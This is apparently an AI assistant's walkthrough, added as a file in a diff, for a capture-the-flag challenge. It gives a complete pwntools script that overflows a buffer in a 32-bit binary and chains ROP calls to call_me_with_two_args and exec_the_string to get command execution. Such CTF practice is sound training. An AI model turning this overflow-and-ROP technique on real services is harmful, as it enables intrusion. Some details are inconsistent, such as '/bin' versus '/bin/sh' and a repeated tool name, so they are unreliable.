@@ -1,0 +1,109 @@
+To solve this challenge using `pwntools`, you need to exploit the `vulnerable_function` to perform a Return-Oriented Programming (ROP) attack. The goal is to execute the `exec_the_string` function, which will execute a command stored in the `exec_string` variable. Here's how you can approach the challenge step by step:
+
+---
+
+### **Steps to Solve the Challenge**
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit statically linked ELF file.
+   - The `vulnerable_function` has a buffer overflow vulnerability due to the `read` function, which allows us to overwrite the saved return address on the stack.
+   - The `call_me_with_two_args` function can be used to set the `exec_string` to `/bin` if called with specific arguments (`a1 = -559038737` and `a2 = -889275714`).
+   - The `exec_the_string` function executes the command stored in `exec_string`.
+
+2. **Plan the Exploit**:
+   - Overflow the buffer in `vulnerable_function` to control the return address.
+   - Use ROP to call `call_me_with_two_args` with the required arguments to set `exec_string` to `/bin`.
+   - Use ROP to call `exec_the_string` to execute the command.
+
+3. **Set Up pwntools**:
+   - Use `pwntools` to craft the payload and interact with the binary.
+
+4. **Write the Exploit Code**:
+   - Use `ROP` gadgets to chain the function calls.
+   - Send the payload to the binary.
+
+---
+
+### **Exploit Code**
+
+Here is the Python exploit script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = ELF('./rop', checksec=False)
+context.binary = binary
+context.log_level = 'debug'
+
+# Start the process or connect to the remote server
+# p = process('./rop')  # Uncomment this for local testing
+p = remote('challenge.server.com', 1337)  # Replace with actual host and port
+
+# Gadgets and addresses
+call_me_with_two_args = binary.symbols['call_me_with_two_args']
+exec_the_string = binary.symbols['exec_the_string']
+
+# Offsets
+buffer_size = 136  # Size of the buffer in vulnerable_function
+saved_ebp_offset = 4  # Offset for saved EBP
+ret_offset = buffer_size + saved_ebp_offset
+
+# Arguments for call_me_with_two_args
+arg1 = -559038737  # 0xdeadbeef in signed 32-bit
+arg2 = -889275714  # 0xcafebabe in signed 32-bit
+
+# Craft the payload
+payload = b'A' * ret_offset  # Overflow the buffer
+payload += p32(call_me_with_two_args)  # Address of call_me_with_two_args
+payload += p32(exec_the_string)  # Return address after call_me_with_two_args
+payload += p32(arg1)  # First argument to call_me_with_two_args
+payload += p32(arg2)  # Second argument to call_me_with_two_args
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### **Explanation of the Code**
+
+1. **Binary Setup**:
+   - Load the binary using `pwntools`' `ELF` module to extract symbols and addresses.
+
+2. **Buffer Overflow**:
+   - The buffer size is 136 bytes, and the saved EBP is 4 bytes after that. The total offset to the return address is 140 bytes.
+
+3. **ROP Chain**:
+   - The payload first calls `call_me_with_two_args` with the required arguments to set `exec_string` to `/bin`.
+   - After `call_me_with_two_args` returns, the payload calls `exec_the_string` to execute the command.
+
+4. **Payload Construction**:
+   - The payload consists of:
+     - Padding to overflow the buffer.
+     - Address of `call_me_with_two_args`.
+     - Address of `exec_the_string` (return address after `call_me_with_two_args`).
+     - Arguments for `call_me_with_two_args`.
+
+5. **Interaction**:
+   - The payload is sent to the binary, and an interactive session is started to interact with the shell.
+
+---
+
+### **Testing the Exploit**
+
+- Test the exploit locally using `process('./rop')`.
+- If the challenge is hosted remotely, replace `process` with `remote` and provide the host and port.
+
+---
+
+### **Notes**
+
+- Ensure that the binary is running in an environment where `/bin/sh` is accessible.
+- If ASLR is enabled, you may need to leak addresses or disable ASLR for local testing.
+- If the binary is stripped, you may need to use tools like `ROPgadget` or `ROPgadget` to find gadgets manually.
+
+Good luck with the challenge! Let me know if you need further clarification.
